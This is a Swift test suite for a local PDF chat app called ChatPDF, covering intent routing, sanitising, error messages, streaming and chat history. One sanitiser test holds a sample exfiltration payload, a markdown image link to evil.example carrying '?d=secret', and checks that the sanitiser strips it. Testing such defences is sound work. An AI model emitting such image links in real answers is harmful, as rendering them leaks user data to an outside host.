//
//  ChatPDFTests.swift
//  ChatPDFTests
//

import Foundation
import MLXLMCommon
import Testing
import VecturaKit
import VecturaMLXKit
@testable import ChatPDF

/// Runs the intent router against the real bundled embedder.
@Suite(.serialized)
struct IntentRouterTests {
    private static func makeRouter() async throws -> IntentRouter {
        let url = try #require(Bundle.main.resourceURL)
        let embedder = try await MLXEmbedder(configuration: ModelConfiguration(directory: url))
        return IntentRouter(embedder: embedder)
    }

    @Test func generalQuestionsRouteToGeneral() async throws {
        let router = try await Self.makeRouter()
        let questions = [
            "what is this about",
            "can you summarize this document",
            "give me a quick summary",
            "what's the main idea of this pdf?",
        ]
        var hits = 0
        for q in questions where await router.classify(q) == .general { hits += 1 }
        #expect(hits >= 3, "general recall \(hits)/\(questions.count)")
    }

    @Test func offTopicQuestionsRouteToUnrelated() async throws {
        let router = try await Self.makeRouter()
        let questions = [
            "what's the weather like in Paris",
            "tell me a funny joke",
            "write a haiku about the ocean",
            "who is the president of the United States",
        ]
        var hits = 0
        for q in questions where await router.classify(q) == .unrelated { hits += 1 }
        #expect(hits >= 3, "unrelated recall \(hits)/\(questions.count)")
    }

    /// Wrongly refusing or summarising a real question is the costly error,
    /// so specific document questions must never leave "topical".
    @Test func specificQuestionsStayTopical() async throws {
        let router = try await Self.makeRouter()
        let questions = [
            "what was the sample size in the experiment",
            "who signed the contract and on what date",
            "what does section 3 say about liability",
            "which dataset was used for evaluation",
            "how is the loss function defined",
        ]
        for q in questions {
            let intent = await router.classify(q)
            #expect(intent == .topical, "\"\(q)\" routed to \(intent.rawValue)")
        }
    }
}

struct OutputSanitizerTests {
    @Test func removesImagesLinksAndHTML() {
        let evil = """
        Here you go ![x](https://evil.example/?d=secret) and [click](https://evil.example) \
        <img src="https://evil.example/a.png"> see https://evil.example/path
        """
        let cleaned = VecturaService.stripRemoteContent(evil)
        #expect(!cleaned.contains("evil.example"))
        #expect(!cleaned.contains("!["))
        #expect(!cleaned.contains("<img"))
        #expect(cleaned.contains("click"))
    }

    @Test func leavesNormalTextAlone() {
        #expect(VecturaService.stripRemoteContent("Throughput was 33.8 Mbps (see Table III).") == "Throughput was 33.8 Mbps (see Table III).")
    }
}

struct LocalModelFolderTests {
    private func emptyTempDir() throws -> URL {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        return dir
    }

    @Test func rejectsFolderWithoutConfig() async throws {
        let service = try await VecturaService()
        let dir = try emptyTempDir()
        await #expect(throws: LocalModelError.self) { try await service.loadLocalLLM(from: dir) }
    }

    @Test func rejectsFolderWithoutWeights() async throws {
        let service = try await VecturaService()
        let dir = try emptyTempDir()
        try Data("{}".utf8).write(to: dir.appendingPathComponent("config.json"))
        await #expect(throws: LocalModelError.self) { try await service.loadLocalLLM(from: dir) }
    }

    @MainActor
    @Test func bookmarkRoundTrips() throws {
        let dir = try emptyTempDir()
        ModelBookmark.clear()
        defer { ModelBookmark.clear() }
        ModelBookmark.save(dir)
        let resolved = try #require(ModelBookmark.resolve())
        #expect(resolved.resolvingSymlinksInPath().path == dir.resolvingSymlinksInPath().path)
        ModelBookmark.clear()
        #expect(ModelBookmark.resolve() == nil)
    }
}

struct ErrorMessageTests {
    @Test func messagesAreSpecificAndActionable() {
        #expect(VecturaService.userMessage(for: URLError(.notConnectedToInternet)).contains("network"))
        #expect(VecturaService.userMessage(for: CancellationError()).contains("cancelled"))
        let generic = VecturaService.userMessage(for: IngestError.emptyPDF)
        #expect(generic.contains("PDF is empty"))
        #expect(!generic.contains("Problem with handling"))
    }
}

@MainActor
struct StreamingChatTests {
    @Test func streamedTextIsReplacedByFinalAnswerWithSources() async throws {
        let vm = ChatViewModel()
        vm.input = "hello?"
        vm.send()

        var sawPartial = false
        var typingID: UUID?
        for _ in 0..<60 {
            try await Task.sleep(for: .milliseconds(100))
            if let last = vm.messages.last {
                typingID = typingID ?? last.id
                if last.role == .assistant, last.answer == nil, !last.text.isEmpty { sawPartial = true }
                if last.answer != nil { break }
            }
        }
        let last = try #require(vm.messages.last)
        #expect(sawPartial, "never saw streamed text before the final answer")
        #expect(last.answer != nil)
        #expect(!last.sources.isEmpty)
        #expect(last.id == typingID, "streamed message should keep one stable id")
        #expect(vm.messages.filter { $0.role == .typing }.isEmpty)
        #expect(!vm.isRunning)
    }
}

struct StartupMessageTests {
    @Test func missingEmbedderGivesActionableMessage() {
        struct E: Error, CustomStringConvertible { var description: String { "configurationFileError(\"config.json\", \"Contents/Resources\")" } }
        let msg = VecturaService.startupMessage(for: E())
        #expect(msg.contains("download_model.py"))
        #expect(msg.contains("rebuild"))
    }

    @Test func otherFailuresStillExplain() {
        let msg = VecturaService.startupMessage(for: URLError(.cannotConnectToHost))
        #expect(msg.contains("couldn't start"))
    }
}

struct PDFStagingTests {
    @Test func stagesACopyThatCanBeOpened() throws {
        let src = FileManager.default.temporaryDirectory.appendingPathComponent("src-\(UUID().uuidString).pdf")
        try Data("%PDF-1.4".utf8).write(to: src)
        let staged = try PDFStaging.stage(src)
        #expect(staged != src)
        #expect(staged.lastPathComponent == src.lastPathComponent)
        #expect(FileManager.default.isReadableFile(atPath: staged.path))
        PDFStaging.cleanUp()
        #expect(!FileManager.default.fileExists(atPath: staged.path))
    }

    @Test func unreadableFileGivesNamedError() {
        let missing = URL(fileURLWithPath: "/nonexistent/dir/report.pdf")
        do {
            _ = try PDFStaging.stage(missing)
            Issue.record("expected an error")
        } catch let error as IngestError {
            #expect(error.description.contains("report.pdf"))
        } catch {
            Issue.record("unexpected error \(error)")
        }
    }
}

struct ContextSelectionTests {
    private func result(_ score: Float) -> VecturaSearchResult {
        VecturaSearchResult(id: UUID(), text: "chunk \(score)", score: score, createdAt: Date())
    }

    @Test func lowScoresStillYieldTheTopChunks() {
        // Every score below the 0.22 cutoff used to produce an empty context.
        let picked = VecturaService.selectContext([result(0.19), result(0.17), result(0.10), result(0.05), result(0.04)])
        #expect(picked.count >= 2)
        #expect(picked.first?.score == 0.19)
    }

    @Test func weakTailIsDroppedWhenTopScoresAreStrong() {
        let picked = VecturaService.selectContext([result(0.60), result(0.50), result(0.30), result(0.10), result(0.05)])
        #expect(picked.map(\.score) == [0.60, 0.50, 0.30])
    }

    @Test func emptyResultsStayEmpty() {
        #expect(VecturaService.selectContext([]).isEmpty)
    }
}

struct DocumentCleanupTests {
    @Test func referencesAreDroppedFromTheSecondHalf() {
        let pages = ["Intro text", "Methods text", "Results text", "Conclusion\nReferences\n[1] Smith 2020", "[2] Jones 2019"]
        let kept = VecturaService.removeReferences(from: pages)
        #expect(kept.count == 4)
        #expect(kept.last == "Conclusion")
        #expect(VecturaService.removeReferences(from: ["References\nearly", "body", "body", "body"]) == ["References\nearly", "body", "body", "body"])
    }
}

struct ChatHistoryTests {
    @Test func historyKeepsSystemMessageAndIsBounded() async throws {
        let service = try await VecturaService()
        try await service.clearAll()
        let greetings = ["hello", "thanks", "hi", "thank you", "hey", "thx"]   // canned replies, no LLM needed
        for g in greetings { _ = await service.reply(to: g) }

        let history = await service.history
        #expect(history.first?.role == .system)
        #expect(history.count == 1 + 3 * 2, "keeps the system message plus the last 3 exchanges")
        #expect(history.dropFirst().map(\.role) == [.user, .assistant, .user, .assistant, .user, .assistant])
        #expect(history.last?.text == "You're welcome.")
    }

    @Test func clearAllResetsHistoryButKeepsSystemMessage() async throws {
        let service = try await VecturaService()
        _ = await service.reply(to: "hello")
        #expect(await service.history.count > 1)
        try await service.clearAll()
        let history = await service.history
        #expect(history.count == 1)
        #expect(history.first?.role == .system)
    }

    @Test func messagesConvertToChatRolesInOrder() {
        let msgs = [ChatMessage(role: .system, text: "s"), ChatMessage(role: .user, text: "q"), ChatMessage(role: .assistant, text: "a")]
        #expect(msgs.asChatHistory().count == 3)
        #expect(msgs.asChatHistory().map(\.content) == ["s", "q", "a"])
    }
}
